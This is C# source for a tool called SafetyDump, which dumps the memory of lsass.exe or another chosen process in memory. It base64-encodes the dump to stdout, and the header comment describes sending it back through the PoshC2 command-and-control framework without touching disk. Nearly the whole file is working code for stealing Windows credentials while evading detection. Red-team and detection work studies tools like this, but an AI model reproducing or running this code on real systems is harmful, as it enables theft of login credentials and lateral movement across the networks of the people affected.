using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Text;
using System.Linq.Expressions;

/*
 * SafetyDump is an in-memory process memory dumper.
 * 
 * This uses the Minidump Windows API to dump process memory before base64 encoding that dump and writing it to standard output.
 * This allows the dump to be redirected to a file or straight back down C2 or through other tools.
 * 
 * Note as everything takes place in memory this can be memory intensive while the dumping is taking place.
 * 
 * See its integration with https://github.com/nettitude/PoshC2 for how it can be used to dump process memory down C2 without the executable or the dump touching disk.
 *
 * Running the compiled binary without any arguments will find and dump lsass.exe.
 * 		./SafetyDump.exe
 *
 * Passing a PID to the program will instead dump that process.
 * 		./SafetyDump.exe <processIdToDump>
 * 
 */
namespace SafetyDump
{
    public class Program
    {

        private static void Minidump(int pid = -1)
        {
            IntPtr targetProcessHandle;
            uint targetProcessId = 0;

            Process targetProcess = null;
            if (pid == -1)
            {
                var processes = Process.GetProcessesByName("lsass");
                targetProcess = processes[0];
            }
            else
            {
                try
                {
                    targetProcess = Process.GetProcessById(pid);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
                    return;
                }
            }

            try
            {
                targetProcessId = (uint)targetProcess.Id;
                targetProcessHandle = targetProcess.Handle;
            }
            catch (Exception e)
            {
                Console.WriteLine($"\n[-] Error getting handle to {targetProcess.ProcessName} ({targetProcess.Id}):\n");
                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
                return;
            }

            try
            { 


                var byteArray = new byte[60 * 1024 * 1024];
                var callbackPtr = new Internals.MinidumpCallbackRoutine((param, input, output) =>
                {
                    var inputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_INPUT>(input);
                    var outputStruct = Marshal.PtrToStructure<Internals.MINIDUMP_CALLBACK_OUTPUT>(output);
                    switch (inputStruct.CallbackType)
                    {
                        case Internals.MINIDUMP_CALLBACK_TYPE.IoStartCallback:
                            outputStruct.status = Internals.HRESULT.S_FALSE;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case Internals.MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback:
                            var ioStruct = inputStruct.Io;
                            if ((int)ioStruct.Offset + ioStruct.BufferBytes >= byteArray.Length)
                            {
                                Array.Resize(ref byteArray, byteArray.Length * 2);
                            }
                            Marshal.Copy(ioStruct.Buffer, byteArray, (int)ioStruct.Offset, ioStruct.BufferBytes);
                            outputStruct.status = Internals.HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        case Internals.MINIDUMP_CALLBACK_TYPE.IoFinishCallback:
                            outputStruct.status = Internals.HRESULT.S_OK;
                            Marshal.StructureToPtr(outputStruct, output, true);
                            return true;
                        default:
                            return true;
                    }
                });

                var callbackInfo = new Internals.MINIDUMP_CALLBACK_INFORMATION
                {
                    CallbackRoutine = callbackPtr, CallbackParam = IntPtr.Zero
                };

                var size = Marshal.SizeOf(callbackInfo);
                var callbackInfoPtr = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(callbackInfo, callbackInfoPtr, false);

                if (Internals.MiniDumpWriteDump(targetProcessHandle, targetProcessId, IntPtr.Zero, (uint)2, IntPtr.Zero, IntPtr.Zero, callbackInfoPtr))
                {
                    Console.OutputEncoding = Encoding.UTF8;
                    Console.Write(Convert.ToBase64String((byteArray)));
                    return;

                }
                Console.WriteLine("[-] Dump failed");
                Console.WriteLine(Marshal.GetLastWin32Error());
            }
            catch  (Exception e)
            {
                Console.WriteLine("[-] Exception dumping process memory");
                Console.WriteLine($"\n[-] {e.Message}\n{e.StackTrace}");
            }

        }
    
        public static void Main(string[] args)
        {

            if (args.Length == 0)
            {
                Minidump();
            }
            else
            {
                var pid = -1;
                try
                {
                    pid = Convert.ToInt32(args[0]);
                }
                catch (Exception e)
                {
                    Console.WriteLine($"\n[-] Error converting argument ({args[0]}) to PID: {e.Message}");
                    return;
                }
                Minidump(pid);
            }
        }
    }
}